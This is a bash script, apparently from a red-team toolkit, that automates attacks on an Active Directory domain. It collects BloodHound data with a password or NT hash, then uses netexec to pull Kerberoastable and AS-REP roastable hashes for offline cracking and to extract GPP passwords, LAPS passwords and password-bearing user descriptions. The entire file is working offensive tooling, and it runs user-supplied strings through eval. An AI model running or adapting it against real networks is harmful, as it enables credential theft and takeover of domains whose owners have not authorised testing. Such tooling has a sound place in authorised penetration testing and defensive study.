#!/usr/bin/env bash
# rta-bloodhound-ingest — Automated BloodHound data collection and analysis.
#
# Runs bloodhound-python collection, imports results, and queries for
# common attack paths automatically. Saves high-value findings to a report.
#
# Usage:
#   rta-bloodhound-ingest -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'
#   rta-bloodhound-ingest -t 192.168.56.10 -d corp.local -u jsmith -H 'NT_HASH'
#   rta-bloodhound-ingest --query-only  # just run attack path queries

set -euo pipefail

# ── Parse arguments ──────────────────────────────────────────────────────────
DC=""
DOMAIN=""
USER=""
PASS=""
HASH=""
QUERY_ONLY=false
OUT_DIR="./bloodhound-$(date +%Y%m%d-%H%M%S)"

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target) DC="$2"; shift 2 ;;
        -d|--domain) DOMAIN="$2"; shift 2 ;;
        -u|--user)   USER="$2"; shift 2 ;;
        -p|--pass)   PASS="$2"; shift 2 ;;
        -H|--hash)   HASH="$2"; shift 2 ;;
        --query-only) QUERY_ONLY=true; shift ;;
        -o|--output) OUT_DIR="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

mkdir -p "${OUT_DIR}"

echo ""
echo "  ── RTA BloodHound Ingest ──"
echo ""

# ── Step 1: Collect BloodHound data ─────────────────────────────────────────
if [ "${QUERY_ONLY}" = false ]; then
    if [ -z "${DC}" ] || [ -z "${DOMAIN}" ] || [ -z "${USER}" ]; then
        echo "  [-] Required: -t <DC_IP> -d <domain> -u <user> (-p <pass> or -H <hash>)"
        exit 1
    fi

    echo "  [>] Running BloodHound-Python collection..."

    BH_CMD="bloodhound-python -d ${DOMAIN} -u ${USER} -dc ${DC} -c All --zip -o ${OUT_DIR}/"

    if [ -n "${PASS}" ]; then
        BH_CMD="${BH_CMD} -p '${PASS}'"
    elif [ -n "${HASH}" ]; then
        BH_CMD="${BH_CMD} --hashes '${HASH}'"
    fi

    if eval "${BH_CMD}" 2>/dev/null; then
        echo "  [+] Collection complete — data in ${OUT_DIR}/"
    else
        echo "  [-] BloodHound collection failed"
        echo "  [*] Trying alternate: netexec ldap collection..."
        NXC_CMD="netexec ldap ${DC} -d ${DOMAIN} -u ${USER}"
        if [ -n "${PASS}" ]; then
            NXC_CMD="${NXC_CMD} -p '${PASS}'"
        elif [ -n "${HASH}" ]; then
            NXC_CMD="${NXC_CMD} -H '${HASH}'"
        fi
        NXC_CMD="${NXC_CMD} --bloodhound --collection All -o ${OUT_DIR}/"
        eval "${NXC_CMD}" 2>/dev/null || echo "  [-] netexec collection also failed"
    fi
fi

# ── Step 2: Quick LDAP queries for high-value targets ────────────────────────
if [ "${QUERY_ONLY}" = false ] && [ -n "${DC}" ]; then
    REPORT="${OUT_DIR}/attack-paths.txt"
    echo "" > "${REPORT}"

    echo "  [>] Querying high-value targets via LDAP..."

    NXC_BASE="netexec ldap ${DC} -d ${DOMAIN} -u ${USER}"
    if [ -n "${PASS}" ]; then
        NXC_BASE="${NXC_BASE} -p '${PASS}'"
    elif [ -n "${HASH}" ]; then
        NXC_BASE="${NXC_BASE} -H '${HASH}'"
    fi

    # Kerberoastable accounts
    echo "  [>] Kerberoastable users..."
    echo "=== KERBEROASTABLE ACCOUNTS ===" >> "${REPORT}"
    eval "${NXC_BASE} --kerberoasting ${OUT_DIR}/kerberoast.txt" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # AS-REP roastable
    echo "  [>] AS-REP roastable users..."
    echo "=== AS-REP ROASTABLE ===" >> "${REPORT}"
    eval "${NXC_BASE} --asreproast ${OUT_DIR}/asrep.txt" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # Unconstrained delegation
    echo "  [>] Unconstrained delegation..."
    echo "=== UNCONSTRAINED DELEGATION ===" >> "${REPORT}"
    eval "${NXC_BASE} --trusted-for-delegation" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # Password not required
    echo "  [>] Accounts with PASSWD_NOTREQD..."
    echo "=== PASSWD_NOTREQD ===" >> "${REPORT}"
    eval "${NXC_BASE} --password-not-required" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # Admin count users
    echo "  [>] AdminCount=1 users..."
    echo "=== ADMIN COUNT USERS ===" >> "${REPORT}"
    eval "${NXC_BASE} --admin-count" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # Users with description (often contains passwords)
    echo "  [>] User descriptions (may contain passwords)..."
    echo "=== USER DESCRIPTIONS ===" >> "${REPORT}"
    eval "${NXC_BASE} -M get-desc-users" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # GPP passwords
    echo "  [>] GPP passwords..."
    echo "=== GPP PASSWORDS ===" >> "${REPORT}"
    eval "${NXC_BASE} -M gpp_password" >> "${REPORT}" 2>/dev/null || true
    eval "netexec smb ${DC} -d ${DOMAIN} -u ${USER} $([ -n "${PASS}" ] && echo "-p '${PASS}'" || echo "-H '${HASH}'") -M gpp_password" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    # LAPS passwords (if readable)
    echo "  [>] LAPS passwords..."
    echo "=== LAPS PASSWORDS ===" >> "${REPORT}"
    eval "${NXC_BASE} -M laps" >> "${REPORT}" 2>/dev/null || true
    echo "" >> "${REPORT}"

    echo "  [+] Attack path report: ${REPORT}"
fi

# ── Step 3: Summary ──────────────────────────────────────────────────────────
echo ""
echo "  [*] Output directory: ${OUT_DIR}/"
echo ""

if [ -d "${OUT_DIR}" ]; then
    echo "  Files generated:"
    ls -la "${OUT_DIR}/" 2>/dev/null | tail -n +2 | while read -r line; do
        echo "    ${line}"
    done
fi

echo ""
echo "  [*] Next steps:"
echo "    1. Import .zip into BloodHound CE:"
echo "       curl -L https://ghst.ly/getbhce | docker compose -f - up"
echo "    2. Check ${OUT_DIR}/kerberoast.txt for crackable hashes"
echo "    3. Review ${OUT_DIR}/attack-paths.txt for quick wins"
echo ""
